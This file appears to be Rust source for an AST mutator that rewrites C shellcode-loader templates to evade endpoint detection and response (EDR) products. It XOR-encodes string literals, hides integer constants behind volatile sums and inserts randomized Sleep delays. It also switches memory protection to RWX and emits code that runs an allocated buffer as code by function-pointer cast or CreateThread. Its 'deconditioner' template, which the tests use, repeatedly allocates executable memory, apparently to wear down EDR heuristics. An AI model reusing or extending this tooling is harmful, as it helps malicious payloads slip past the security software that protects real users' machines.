//! AST-level mutations using tree-sitter for structural code transforms.
//!
//! Two mutation modes:
//! - **Marker-based**: MutationSpec { id: "ast.<name>" } → `@MUTATE:<name>` locations
//! - **Global**: `ast.string_xor` / `ast.const_obfuscation` → all literals (no markers needed)
//!
//! Supported mutations:
//! - `ast.decon_rounds`          — iteration count (EDR cutoff threshold)
//! - `ast.fill_pattern`          — benign data content (entropy / memory scan)
//! - `ast.exec_decoy`            — execute from allocated memory (#1 EDR signal)
//! - `ast.timing_pattern`        — inter-operation delays (temporal tokens)
//! - `ast.protection_transition` — memory protection pattern (rule match)
//! - `ast.const_obfuscation`     — volatile decomposition of integer constants (global, tree-sitter)
//! - `ast.string_xor`            — XOR-encode string literals (global, tree-sitter)
//!
//! Adding a new marker-based mutation:
//!   1. Add a `// @MUTATE:<name>` marker in the C template
//!   2. Add a match arm in `apply_at_marker()`
//!   3. Implement the handler method

use anyhow::{Context, Result};
use std::collections::HashMap;
use tracing::{debug, info, warn};
use tree_sitter::Parser;

use crate::mutator::MutationSpec;
use crate::template::assembler::{MutationMarker, extract_mutation_markers};

/// AST-level mutator backed by tree-sitter.
pub struct AstMutator {
    parser: Parser,
}

impl AstMutator {
    pub fn new() -> Result<Self> {
        let mut parser = Parser::new();
        let language = tree_sitter_c::LANGUAGE;
        parser
            .set_language(&language.into())
            .context("Failed to set tree-sitter C language")?;
        Ok(Self { parser })
    }

    /// Apply AST mutations to source code.
    ///
    /// Returns the mutated source and a list of applied mutation IDs.
    ///
    /// Mutation routing:
    /// - `const_obfuscation` → global (tree-sitter walk, `number_literal` nodes)
    /// - `string_xor`        → global (tree-sitter walk, `string_literal` nodes)
    /// - All others          → marker-based (`@MUTATE:<name>` comments)
    pub fn apply(
        &mut self,
        source: &str,
        mutations: &[&MutationSpec],
    ) -> Result<(String, Vec<String>)> {
        let mut result = source.to_string();
        let mut applied = Vec::new();

        // Separate global mutations from marker-based ones
        let mut string_xor_spec: Option<&MutationSpec> = None;
        let mut const_obfuscation_spec: Option<&MutationSpec> = None;
        let mut marker_mutations: Vec<&MutationSpec> = Vec::new();

        for mutation in mutations {
            let (_category, name) = mutation.parse();
            match name {
                "string_xor" => string_xor_spec = Some(mutation),
                "const_obfuscation" => const_obfuscation_spec = Some(mutation),
                _ => marker_mutations.push(mutation),
            }
        }

        // Phase 1: marker-based mutations
        for mutation in &marker_mutations {
            let (_category, name) = mutation.parse();

            let markers = extract_mutation_markers(&result);
            let matching: Vec<_> = markers
                .iter()
                .filter(|m| m.name == name || m.name.starts_with(&format!("{}(", name)))
                .collect();

            if matching.is_empty() {
                warn!("No @MUTATE:{} markers found in source", name);
                continue;
            }

            // Parse current source with tree-sitter (for handlers that need the AST)
            let _tree = self.parser.parse(&result, None);

            // Apply bottom-up (reverse line order) to preserve line numbers
            let count = matching.len();
            let before = result.clone();
            for marker in matching.into_iter().rev() {
                result = self.apply_at_marker(&result, marker, name, &mutation.params)?;
            }

            if result != before {
                applied.push(mutation.id.clone());
                info!("Applied ast.{} at {} location(s)", name, count);
            } else {
                debug!(
                    "ast.{} matched {} marker(s) but made no changes",
                    name, count
                );
            }
        }

        // Phase 2a: global const_obfuscation (number_literal nodes)
        if let Some(spec) = const_obfuscation_spec {
            result = self.apply_const_obfuscation(&result, &spec.params)?;
            applied.push(spec.id.clone());
            info!("Applied ast.const_obfuscation globally");
        }

        // Phase 2b: global string_xor (string_literal nodes, runs last)
        if let Some(spec) = string_xor_spec {
            result = self.apply_string_xor(&result, &spec.params)?;
            applied.push(spec.id.clone());
            info!("Applied ast.string_xor globally");
        }

        Ok((result, applied))
    }

    fn apply_at_marker(
        &self,
        source: &str,
        marker: &MutationMarker,
        name: &str,
        params: &HashMap<String, String>,
    ) -> Result<String> {
        match name {
            "decon_rounds" => self.apply_decon_rounds(source, marker, params),
            "fill_pattern" => self.apply_fill_pattern(source, marker, params),
            "exec_decoy" => self.apply_exec_decoy(source, marker, params),
            "timing_pattern" => self.apply_timing_pattern(source, marker, params),
            "protection_transition" => self.apply_protection_transition(source, marker, params),
            _ => {
                debug!("Unimplemented AST mutation: {} (skipping)", name);
                Ok(source.to_string())
            }
        }
    }

    // ── decon_rounds ──────────────────────────────────────────────────────

    fn apply_decon_rounds(
        &self,
        source: &str,
        marker: &MutationMarker,
        params: &HashMap<String, String>,
    ) -> Result<String> {
        let count: u32 = params
            .get("count")
            .and_then(|v| v.parse().ok())
            .unwrap_or(20);
        let method = params.get("method").map(|s| s.as_str()).unwrap_or("fixed");

        let lines: Vec<&str> = source.lines().collect();
        let marker_idx = marker.line - 1; // 1-indexed → 0-indexed

        // Find the for-loop line after the marker
        let for_idx = (marker_idx + 1..lines.len()).find(|&i| lines[i].trim().starts_with("for"));

        let Some(for_idx) = for_idx else {
            warn!(
                "decon_rounds: no for-loop found after marker at line {}",
                marker.line
            );
            return Ok(source.to_string());
        };

        let indent: String = lines[for_idx]
            .chars()
            .take_while(|c| c.is_whitespace())
            .collect();
        let mut out: Vec<String> = lines.iter().map(|l| l.to_string()).collect();

        match method {
            "fixed" => {
                out[for_idx] = out[for_idx].replace("DECON_ROUNDS", &count.to_string());
            }
            "runtime" => {
                let half = count / 2;
                let init = format!(
                    "{}int __decon_n = (GetTickCount() % {}) + {};",
                    indent, count, half
                );
                out[for_idx] = out[for_idx].replace("DECON_ROUNDS", "__decon_n");
                out.insert(for_idx, init);
            }
            _ => {
                warn!("decon_rounds: unknown method '{}', skipping", method);
            }
        }

        Ok(out.join("\n"))
    }

    // ── fill_pattern ──────────────────────────────────────────────────────

    fn apply_fill_pattern(
        &self,
        source: &str,
        marker: &MutationMarker,
        params: &HashMap<String, String>,
    ) -> Result<String> {
        let pattern = params.get("pattern").map(|s| s.as_str()).unwrap_or("xor");

        if pattern == "xor" {
            return Ok(source.to_string()); // default, no change
        }

        let lines: Vec<&str> = source.lines().collect();
        let marker_idx = marker.line - 1;

        // Find the fill loop start
        let fill_start =
            (marker_idx + 1..lines.len()).find(|&i| lines[i].trim().starts_with("for"));

        let Some(fill_start) = fill_start else {
            warn!(
                "fill_pattern: no for-loop found after marker at line {}",
                marker.line
            );
            return Ok(source.to_string());
        };

        let fill_end = find_block_end(&lines, fill_start);
        let indent: String = lines[fill_start]
            .chars()
            .take_while(|c| c.is_whitespace())
            .collect();

        let replacement = match pattern {
            "nop_sled" => format!(
                "{indent}for (int k = 0; k < PAYLOAD_LEN - 1; k++) {{\n\
                 {indent}    buf[k] = (char)0x90;\n\
                 {indent}}}\n\
                 {indent}buf[PAYLOAD_LEN - 1] = (char)0xC3;"
            ),
            "random" => format!(
                "{indent}{{ unsigned int __rs = (unsigned int)(i * 2654435761u + 0xDEAD);\n\
                 {indent}  for (int k = 0; k < PAYLOAD_LEN; k++) {{\n\
                 {indent}    __rs ^= __rs << 13; __rs ^= __rs >> 17; __rs ^= __rs << 5;\n\
                 {indent}    buf[k] = (char)(__rs & 0xFF);\n\
                 {indent}  }}\n\
                 {indent}}}"
            ),
            "zero" => format!("{indent}memset(buf, 0, PAYLOAD_LEN);"),
            _ => {
                warn!("fill_pattern: unknown pattern '{}', skipping", pattern);
                return Ok(source.to_string());
            }
        };

        let mut out: Vec<String> = lines.iter().map(|l| l.to_string()).collect();
        out.splice(
            fill_start..=fill_end,
            replacement.lines().map(|l| l.to_string()),
        );

        Ok(out.join("\n"))
    }

    // ── exec_decoy ────────────────────────────────────────────────────────

    fn apply_exec_decoy(
        &self,
        source: &str,
        marker: &MutationMarker,
        params: &HashMap<String, String>,
    ) -> Result<String> {
        let method = params.get("method").map(|s| s.as_str()).unwrap_or("none");

        if method == "none" {
            return Ok(source.to_string());
        }

        let lines: Vec<&str> = source.lines().collect();
        let marker_idx = marker.line - 1;

        // Determine indentation from the next code line
        let next_code = (marker_idx + 1..lines.len())
            .find(|&i| !lines[i].trim().is_empty() && !lines[i].trim().starts_with("//"));
        let indent = next_code
            .map(|i| {
                lines[i]
                    .chars()
                    .take_while(|c| c.is_whitespace())
                    .collect::<String>()
            })
            .unwrap_or_else(|| "        ".to_string());

        let exec_code = match method {
            "direct" => format!("{indent}((void(*)())buf)();"),
            "thread" => format!(
                "{indent}{{ HANDLE __ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);\n\
                 {indent}  if (__ht) {{ WaitForSingleObject(__ht, 5000); CloseHandle(__ht); }}\n\
                 {indent}}}"
            ),
            _ => {
                warn!("exec_decoy: unknown method '{}', skipping", method);
                return Ok(source.to_string());
            }
        };

        let mut out: Vec<String> = lines.iter().map(|l| l.to_string()).collect();
        // Insert after the marker line
        for (offset, line) in exec_code.lines().enumerate() {
            out.insert(marker_idx + 1 + offset, line.to_string());
        }

        Ok(out.join("\n"))
    }

    // ── timing_pattern ────────────────────────────────────────────────────

    fn apply_timing_pattern(
        &self,
        source: &str,
        marker: &MutationMarker,
        params: &HashMap<String, String>,
    ) -> Result<String> {
        let min_ms: u32 = params
            .get("min_ms")
            .and_then(|v| v.parse().ok())
            .unwrap_or(10);
        let max_ms: u32 = params
            .get("max_ms")
            .and_then(|v| v.parse().ok())
            .unwrap_or(100);
        let range = max_ms.saturating_sub(min_ms).max(1);

        let lines: Vec<&str> = source.lines().collect();
        let marker_idx = marker.line - 1;

        let target_idx = (marker_idx + 1..lines.len()).find(|&i| {
            let t = lines[i].trim();
            !t.is_empty() && !t.starts_with("//")
        });

        let Some(target_idx) = target_idx else {
            warn!(
                "timing_pattern: no target statement after marker at line {}",
                marker.line
            );
            return Ok(source.to_string());
        };

        let indent: String = lines[target_idx]
            .chars()
            .take_while(|c| c.is_whitespace())
            .collect();
        let sleep_line = format!("{indent}Sleep({min_ms} + (GetTickCount() % {range}));");

        let mut out: Vec<String> = lines.iter().map(|l| l.to_string()).collect();
        out.insert(target_idx, sleep_line);

        Ok(out.join("\n"))
    }

    // ── string_xor (global, no marker needed) ───────────────────────────

    fn apply_string_xor(
        &mut self,
        source: &str,
        params: &HashMap<String, String>,
    ) -> Result<String> {
        let xor_key: u8 = params
            .get("xor_key")
            .and_then(|v| {
                if v.starts_with("0x") || v.starts_with("0X") {
                    u8::from_str_radix(&v[2..], 16).ok()
                } else {
                    v.parse().ok()
                }
            })
            .unwrap_or(0xAA);

        info!("String XOR key: 0x{:02X}", xor_key);

        let tree = match self.parser.parse(source, None) {
            Some(t) => t,
            None => {
                warn!("tree-sitter failed to parse source for string_xor");
                return Ok(source.to_string());
            }
        };

        let mut literals: Vec<(usize, usize, String)> = Vec::new();
        collect_string_literals(tree.root_node(), source.as_bytes(), &mut literals);

        if literals.is_empty() {
            return Ok(source.to_string());
        }

        // Build replacements with forward-ordered counters
        let mut replacements: Vec<(usize, usize, String)> = Vec::new();
        for (counter, (start, end, content)) in literals.iter().enumerate() {
            let var_name = format!("xor_str_{}", counter);
            let encoded: Vec<String> = content
                .bytes()
                .map(|b| format!("0x{:02X}", b ^ xor_key))
                .collect();

            let replacement = format!(
                "({{static char {}[]={{{}}}; static int init_{}=0; if(!init_{}){{for(int i=0;i<{};i++){}[i]^=0x{:02X}; init_{}=1;}} {};}})",
                var_name,
                encoded.join(","),
                var_name,
                var_name,
                encoded.len(),
                var_name,
                xor_key,
                var_name,
                var_name
            );
            replacements.push((*start, *end, replacement));
        }

        // Apply in reverse order to preserve byte offsets
        let mut result = source.to_string();
        for (start, end, replacement) in replacements.into_iter().rev() {
            result.replace_range(start..end, &replacement);
        }

        Ok(result)
    }

    // ── const_obfuscation (global, no marker needed) ────────────────────

    /// Replace integer constants with volatile decomposed sums.
    ///
    /// For each qualifying `number_literal` node, generates:
    /// ```c
    /// volatile unsigned long long __obf_cN_p = X;
    /// volatile unsigned long long __obf_cN = __obf_cN_p + Y;
    /// ```
    /// where `X + Y == original_value`, then replaces the inline constant
    /// with `(int)__obf_cN`. The `volatile` keyword prevents constant folding.
    fn apply_const_obfuscation(
        &mut self,
        source: &str,
        params: &HashMap<String, String>,
    ) -> Result<String> {
        let min_value: u64 = params
            .get("min_value")
            .and_then(|v| v.parse().ok())
            .unwrap_or(2);

        let seed: u64 = params
            .get("seed")
            .and_then(|v| {
                if v.starts_with("0x") || v.starts_with("0X") {
                    u64::from_str_radix(&v[2..], 16).ok()
                } else {
                    v.parse().ok()
                }
            })
            .unwrap_or(0xDEAD);

        info!(
            "Const obfuscation: min_value={}, seed=0x{:X}",
            min_value, seed
        );

        // Inline protection macros so their values become obfuscatable number literals
        let source = inline_protection_macros(source);
        let source = source.as_str();

        let tree = match self.parser.parse(source, None) {
            Some(t) => t,
            None => {
                warn!("tree-sitter failed to parse source for const_obfuscation");
                return Ok(source.to_string());
            }
        };

        let mut literals: Vec<NumberLiteralInfo> = Vec::new();
        collect_number_literals(
            tree.root_node(),
            source.as_bytes(),
            source,
            min_value,
            &mut literals,
        );

        if literals.is_empty() {
            return Ok(source.to_string());
        }

        // Build edits: for each literal, we need:
        //   1. Insert volatile declarations before the containing statement
        //   2. Replace the literal inline with (int)__obf_cN
        //
        // Group by statement start byte to batch declarations.
        struct Edit {
            /// Byte offset where the original number starts
            replace_start: usize,
            /// Byte offset where the original number ends
            replace_end: usize,
            /// The inline replacement text: `(int)__obf_cN`
            inline_text: String,
            /// The volatile declarations to prepend before the statement
            decl_lines: String,
            /// Byte offset of the containing statement (for insertion point)
            stmt_start: usize,
        }

        let mut edits: Vec<Edit> = Vec::new();

        for (counter, lit) in literals.iter().enumerate() {
            let var_name = format!("__obf_c{}", counter);
            let (part_a, part_b) = split_value(lit.value, seed, counter as u64);

            let decl = format!(
                "{indent}volatile unsigned long long {var}_p = {a};\n\
                 {indent}volatile unsigned long long {var} = {var}_p + {b};\n",
                indent = lit.stmt_indent,
                var = var_name,
                a = part_a,
                b = part_b,
            );

            let inline = format!("(int){}", var_name);

            edits.push(Edit {
                replace_start: lit.start_byte,
                replace_end: lit.end_byte,
                inline_text: inline,
                decl_lines: decl,
                stmt_start: lit.stmt_start_byte,
            });
        }

        // Apply edits in reverse byte-offset order to preserve positions.
        // First: inline replacements (reverse order).
        // Second: declaration insertions (reverse order, deduplicated by stmt_start).
        let mut result = source.to_string();

        // Pass 1: Replace inline constants (reverse order)
        for edit in edits.iter().rev() {
            result.replace_range(edit.replace_start..edit.replace_end, &edit.inline_text);
        }

        // Pass 2: Insert declarations (reverse order by stmt_start).
        // We must recalculate insertion points since Pass 1 shifted offsets.
        // Instead, build a line-based approach: figure out which source line
        // each statement starts on, and insert declaration lines before it.

        // Map each edit to its containing statement's line number in the original source
        let mut stmt_line_map: Vec<(usize, String)> = Vec::new(); // (line_number, decl_text)

        for edit in &edits {
            // Convert byte offset to line number in the original source
            let line_num = source[..edit.stmt_start]
                .chars()
                .filter(|c| *c == '\n')
                .count();
            stmt_line_map.push((line_num, edit.decl_lines.clone()));
        }

        // Rebuild the result using line-based insertions on the already-inline-replaced text
        let result_lines: Vec<&str> = result.lines().collect();
        let mut final_lines: Vec<String> = Vec::new();

        // Group declarations by target line (reverse to get highest line first isn't needed
        // since we process line by line). Collect all decls for each line.
        let mut decls_by_line: HashMap<usize, Vec<String>> = HashMap::new();
        for (line_num, decl) in &stmt_line_map {
            decls_by_line
                .entry(*line_num)
                .or_default()
                .push(decl.clone());
        }

        for (i, line) in result_lines.iter().enumerate() {
            if let Some(decls) = decls_by_line.get(&i) {
                // Insert declarations before this line (deduplicate by content)
                let mut seen = std::collections::HashSet::new();
                for decl in decls {
                    if seen.insert(decl.clone()) {
                        // decl already ends with \n, but we're building line-by-line
                        for dl in decl.trim_end_matches('\n').lines() {
                            final_lines.push(dl.to_string());
                        }
                    }
                }
            }
            final_lines.push(line.to_string());
        }

        Ok(final_lines.join("\n"))
    }

    // ── protection_transition ─────────────────────────────────────────────

    fn apply_protection_transition(
        &self,
        source: &str,
        marker: &MutationMarker,
        params: &HashMap<String, String>,
    ) -> Result<String> {
        let pattern = params.get("pattern").map(|s| s.as_str()).unwrap_or("rw_rx");

        if pattern == "rw_rx" {
            return Ok(source.to_string()); // default, no change
        }

        let lines: Vec<&str> = source.lines().collect();
        let marker_idx = marker.line - 1;

        // Find VirtualProtect line after marker
        let vp_idx = (marker_idx + 1..lines.len()).find(|&i| lines[i].contains("VirtualProtect"));

        let Some(vp_idx) = vp_idx else {
            warn!(
                "protection_transition: no VirtualProtect found after marker at line {}",
                marker.line
            );
            return Ok(source.to_string());
        };

        let indent: String = lines[vp_idx]
            .chars()
            .take_while(|c| c.is_whitespace())
            .collect();
        let mut out: Vec<String> = lines.iter().map(|l| l.to_string()).collect();

        match pattern {
            "rw_rwx" => {
                out[vp_idx] = out[vp_idx].replace("p_RX", "p_RWX");
            }
            "rw_r_rx" => {
                // Insert intermediate R protection before the RX step
                let staged = format!("{indent}VirtualProtect(buf, PAYLOAD_LEN, 0x02, &old_prot);");
                out.insert(vp_idx, staged);
            }
            _ => {
                warn!(
                    "protection_transition: unknown pattern '{}', skipping",
                    pattern
                );
            }
        }

        Ok(out.join("\n"))
    }
}

impl Default for AstMutator {
    /// Creates an `AstMutator` with the default C language grammar.
    ///
    /// # Panics
    ///
    /// Panics if tree-sitter C grammar initialization fails (should never
    /// happen unless the tree-sitter-c dependency is broken).
    fn default() -> Self {
        Self::new().expect("Failed to initialize AstMutator: tree-sitter C grammar unavailable")
    }
}

/// Walk tree-sitter AST and collect string literal nodes for XOR encoding.
///
/// Skips string literals inside preprocessor directives (e.g., `#include "..."`,
/// `#pragma comment(lib, "...")`). Nodes are returned in document order.
fn collect_string_literals(
    node: tree_sitter::Node,
    source: &[u8],
    out: &mut Vec<(usize, usize, String)>,
) {
    if node.kind() == "string_literal" {
        // Skip strings inside preprocessor directives
        let mut ancestor = node.parent();
        while let Some(a) = ancestor {
            if a.kind().starts_with("preproc_") {
                return;
            }
            ancestor = a.parent();
        }

        // Extract content between quotes
        if let Ok(text) = node.utf8_text(source)
            && text.len() >= 2
            && text.starts_with('"')
            && text.ends_with('"')
        {
            let content = &text[1..text.len() - 1];
            out.push((node.start_byte(), node.end_byte(), content.to_string()));
        }
        return;
    }

    for i in 0..node.child_count() as u32 {
        if let Some(child) = node.child(i) {
            collect_string_literals(child, source, out);
        }
    }
}

// ── Const obfuscation helpers ──────────────────────────────────────────────

/// Information about a qualifying number literal in the AST.
struct NumberLiteralInfo {
    /// Byte offset where the literal starts in source
    start_byte: usize,
    /// Byte offset where the literal ends in source
    end_byte: usize,
    /// Parsed integer value
    value: u64,
    /// Byte offset where the containing statement starts
    stmt_start_byte: usize,
    /// Indentation string of the containing statement
    stmt_indent: String,
}

/// Walk tree-sitter AST and collect qualifying number_literal nodes.
///
/// Skips:
/// - Constants inside preprocessor directives (`#define`, `#if`, etc.)
/// - Array sizes (`int arr[100]`)
/// - Case label values (`case 5:`)
/// - Initializer list values (`{0xAB, 0xCD, ...}`)
/// - File/global scope constants (no containing compound_statement)
/// - Already-obfuscated declarations (containing `__obf_c`)
/// - Values below `min_value`
/// - Non-integer literals (floats)
fn collect_number_literals(
    node: tree_sitter::Node,
    source_bytes: &[u8],
    source_str: &str,
    min_value: u64,
    out: &mut Vec<NumberLiteralInfo>,
) {
    if node.kind() == "number_literal" {
        let text = match node.utf8_text(source_bytes) {
            Ok(t) => t,
            Err(_) => return,
        };

        // Skip floats
        if text.contains('.') || text.contains('e') || text.contains('E') {
            return;
        }

        // Parse the integer value
        let value = match parse_c_integer(text) {
            Some(v) => v,
            None => return,
        };

        // Skip trivial values
        if value < min_value {
            return;
        }

        // Skip inside preprocessor directives
        if has_ancestor_kind(node, "preproc_") {
            return;
        }

        // Skip array sizes: parent is array_declarator
        if let Some(parent) = node.parent()
            && parent.kind() == "array_declarator"
        {
            return;
        }

        // Skip case label values: first named child of case_statement
        if is_case_label_value(node) {
            return;
        }

        // Skip initializer lists (e.g., supermega_payload[] = {0xAB, ...})
        if has_ancestor_of_kind(node, "initializer_list") {
            return;
        }

        // Skip already-obfuscated declarations
        if is_inside_obf_declaration(node, source_bytes) {
            return;
        }

        // Find containing statement (must be inside a compound_statement)
        let stmt = match find_containing_statement(node) {
            Some(s) => s,
            None => return, // global/file scope — skip
        };

        let stmt_start = stmt.start_byte();
        let indent = calculate_indent(source_str, stmt_start);

        out.push(NumberLiteralInfo {
            start_byte: node.start_byte(),
            end_byte: node.end_byte(),
            value,
            stmt_start_byte: stmt_start,
            stmt_indent: indent,
        });
        return;
    }

    for i in 0..node.child_count() as u32 {
        if let Some(child) = node.child(i) {
            collect_number_literals(child, source_bytes, source_str, min_value, out);
        }
    }
}

/// Check if any ancestor's kind starts with the given prefix.
fn has_ancestor_kind(node: tree_sitter::Node, prefix: &str) -> bool {
    let mut ancestor = node.parent();
    while let Some(a) = ancestor {
        if a.kind().starts_with(prefix) {
            return true;
        }
        ancestor = a.parent();
    }
    false
}

/// Check if any ancestor has exactly the given kind.
fn has_ancestor_of_kind(node: tree_sitter::Node, kind: &str) -> bool {
    let mut ancestor = node.parent();
    while let Some(a) = ancestor {
        if a.kind() == kind {
            return true;
        }
        ancestor = a.parent();
    }
    false
}

/// Check if this node is the value of a `case` label (`case N:`).
fn is_case_label_value(node: tree_sitter::Node) -> bool {
    if let Some(parent) = node.parent()
        && parent.kind() == "case_statement"
    {
        // The value is the first named child
        if let Some(first) = parent.named_child(0) {
            return first.id() == node.id();
        }
    }
    false
}

/// Check if this node is inside a declaration containing `__obf_c` (idempotency).
fn is_inside_obf_declaration(node: tree_sitter::Node, source: &[u8]) -> bool {
    let mut ancestor = node.parent();
    while let Some(a) = ancestor {
        if (a.kind() == "declaration" || a.kind() == "init_declarator")
            && let Ok(text) = a.utf8_text(source)
            && text.contains("__obf_c")
        {
            return true;
        }
        ancestor = a.parent();
    }
    false
}

/// Walk ancestors to find the node whose parent is a `compound_statement`.
/// Returns `None` for file/global scope.
fn find_containing_statement(node: tree_sitter::Node) -> Option<tree_sitter::Node> {
    let mut current = node;
    while let Some(parent) = current.parent() {
        if parent.kind() == "compound_statement" {
            return Some(current);
        }
        if parent.kind() == "translation_unit" {
            return None; // file scope
        }
        current = parent;
    }
    None
}

/// Known protection macros to inline before const obfuscation.
/// Ordered longest-first so `p_RWX` is processed before `p_RW`.
const PROTECTION_MACROS: &[&str] = &["p_RWX", "p_RX", "p_RW"];

/// Inline protection macros so their values become number literals
/// that const_obfuscation can process.
///
/// 1. Parse `#define p_RW 0x04` etc. from source
/// 2. Remove those #define lines
/// 3. Replace identifier usages with literal values
fn inline_protection_macros(source: &str) -> String {
    let mut macros: Vec<(&str, String)> = Vec::new();
    let mut kept_lines: Vec<&str> = Vec::new();

    for line in source.lines() {
        let trimmed = line.trim();
        let mut matched = false;
        for &name in PROTECTION_MACROS {
            let prefix = format!("#define {}", name);
            if trimmed.starts_with(&prefix) {
                let value = trimmed[prefix.len()..].trim().to_string();
                if !value.is_empty() {
                    macros.push((name, value));
                    matched = true;
                    break;
                }
            }
        }
        if !matched {
            kept_lines.push(line);
        }
    }

    if macros.is_empty() {
        return source.to_string();
    }

    let mut result = kept_lines.join("\n");
    // Replace identifiers with values (word-boundary aware)
    for (name, value) in &macros {
        result = replace_word(&result, name, value);
    }
    result
}

/// Replace all word-boundary-delimited occurrences of `word` with `replacement`.
fn replace_word(source: &str, word: &str, replacement: &str) -> String {
    let mut result = String::with_capacity(source.len());
    let bytes = source.as_bytes();
    let word_bytes = word.as_bytes();
    let mut i = 0;

    while i < bytes.len() {
        if i + word_bytes.len() <= bytes.len() && &bytes[i..i + word_bytes.len()] == word_bytes {
            let before_ok = i == 0 || !is_word_char(bytes[i - 1]);
            let after_pos = i + word_bytes.len();
            let after_ok = after_pos >= bytes.len() || !is_word_char(bytes[after_pos]);

            if before_ok && after_ok {
                result.push_str(replacement);
                i = after_pos;
                continue;
            }
        }
        result.push(bytes[i] as char);
        i += 1;
    }
    result
}

fn is_word_char(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// Extract the indentation (whitespace prefix) of the line containing `byte_offset`.
fn calculate_indent(source: &str, byte_offset: usize) -> String {
    // Find the start of the line containing byte_offset
    let line_start = source[..byte_offset]
        .rfind('\n')
        .map(|i| i + 1)
        .unwrap_or(0);
    source[line_start..byte_offset]
        .chars()
        .take_while(|c| c.is_whitespace())
        .collect()
}

/// Parse a C integer literal (hex, octal, binary, decimal), stripping suffixes.
///
/// Supports: `0x3000`, `0X3000`, `0777`, `0b1010`, `42`, `42u`, `42ULL`, etc.
fn parse_c_integer(text: &str) -> Option<u64> {
    // Strip common C suffixes: u, U, l, L, ll, LL, ull, ULL, etc.
    let stripped = text.trim_end_matches(['u', 'U', 'l', 'L']);

    if stripped.is_empty() {
        return None;
    }

    if stripped.starts_with("0x") || stripped.starts_with("0X") {
        u64::from_str_radix(&stripped[2..], 16).ok()
    } else if stripped.starts_with("0b") || stripped.starts_with("0B") {
        u64::from_str_radix(&stripped[2..], 2).ok()
    } else if stripped.starts_with('0')
        && stripped.len() > 1
        && stripped.chars().all(|c| c.is_ascii_digit())
    {
        u64::from_str_radix(&stripped[1..], 8).ok()
    } else {
        stripped.parse::<u64>().ok()
    }
}

/// Deterministic split: returns `(a, b)` where `a + b == value`.
///
/// Uses a Knuth multiplicative hash of `seed + counter` to produce the split.
fn split_value(value: u64, seed: u64, counter: u64) -> (u64, u64) {
    if value == 0 {
        return (0, 0);
    }
    // Knuth multiplicative hash
    let hash = (seed.wrapping_add(counter))
        .wrapping_mul(6364136223846793005)
        .wrapping_add(1442695040888963407);
    // a is hash mod value (ensuring a < value so b > 0)
    let a = hash % value;
    let b = value - a;
    (a, b)
}

/// Find the end of a code block starting at `start_line`.
///
/// Tracks brace nesting to find the matching closing `}`.
/// Falls back to same line if no braces are found.
fn find_block_end(lines: &[&str], start_line: usize) -> usize {
    let mut depth: i32 = 0;
    let mut found_open = false;

    for (i, line) in lines.iter().enumerate().skip(start_line) {
        for ch in line.chars() {
            if ch == '{' {
                depth += 1;
                found_open = true;
            } else if ch == '}' {
                depth -= 1;
                if found_open && depth == 0 {
                    return i;
                }
            }
        }
    }

    // Fallback: if no block found, return start line
    start_line
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The basic.c template content used across all tests.
    fn basic_template() -> &'static str {
        r#"#include "../header/definitions.h"

#ifndef DECON_ROUNDS
#define DECON_ROUNDS 20
#endif

void deconditioner() {
    DWORD old_prot;

    // @MUTATE:decon_rounds
    for (int i = 0; i < DECON_ROUNDS; i++) {

        char *buf = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
        if (!buf) continue;

        // @MUTATE:fill_pattern
        for (int k = 0; k < PAYLOAD_LEN; k++) {
            buf[k] = (char)(k ^ (i + 0x41));
        }

        // @MUTATE:timing_pattern
        // @MUTATE:protection_transition
        VirtualProtect(buf, PAYLOAD_LEN, p_RX, &old_prot);

        // @MUTATE:exec_decoy

        // @MUTATE:timing_pattern
        VirtualFree(buf, 0, 0x8000);
    }
}"#
    }

    fn make_spec(id: &str, params: &[(&str, &str)]) -> MutationSpec {
        MutationSpec {
            id: id.to_string(),
            params: params
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect(),
        }
    }

    #[test]
    fn test_decon_rounds_fixed() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.decon_rounds", &[("count", "50"), ("method", "fixed")]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        assert!(applied.contains(&"ast.decon_rounds".to_string()));
        assert!(out.contains("i < 50"));
        assert!(!out.contains("DECON_ROUNDS;"));
    }

    #[test]
    fn test_decon_rounds_runtime() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec(
            "ast.decon_rounds",
            &[("count", "50"), ("method", "runtime")],
        );
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        assert!(applied.contains(&"ast.decon_rounds".to_string()));
        assert!(out.contains("GetTickCount()"));
        assert!(out.contains("__decon_n"));
        assert!(out.contains("i < __decon_n"));
    }

    #[test]
    fn test_fill_pattern_nop_sled() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.fill_pattern", &[("pattern", "nop_sled")]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        assert!(applied.contains(&"ast.fill_pattern".to_string()));
        assert!(out.contains("0x90"));
        assert!(out.contains("0xC3"));
        // Original XOR fill should be gone
        assert!(!out.contains("k ^ (i + 0x41)"));
    }

    #[test]
    fn test_fill_pattern_random() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.fill_pattern", &[("pattern", "random")]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        assert!(applied.contains(&"ast.fill_pattern".to_string()));
        assert!(out.contains("2654435761u"));
        assert!(out.contains("__rs ^="));
        assert!(!out.contains("k ^ (i + 0x41)"));
    }

    #[test]
    fn test_fill_pattern_zero() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.fill_pattern", &[("pattern", "zero")]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        assert!(applied.contains(&"ast.fill_pattern".to_string()));
        assert!(out.contains("memset(buf, 0, PAYLOAD_LEN)"));
        assert!(!out.contains("k ^ (i + 0x41)"));
    }

    #[test]
    fn test_fill_pattern_xor_noop() {
        let mut ast = AstMutator::new().unwrap();
        let spec = make_spec("ast.fill_pattern", &[("pattern", "xor")]);
        let (out, applied) = ast.apply(basic_template(), &[&spec]).unwrap();

        // Default "xor" makes no changes → not recorded as applied
        assert!(applied.is_empty());
        // Default "xor" should leave source unchanged
        assert!(out.contains("k ^ (i + 0x41)"));
    }

    #[test]
    fn test_exec_decoy_direct() {
        let mut ast = AstMutator::new().unwrap();
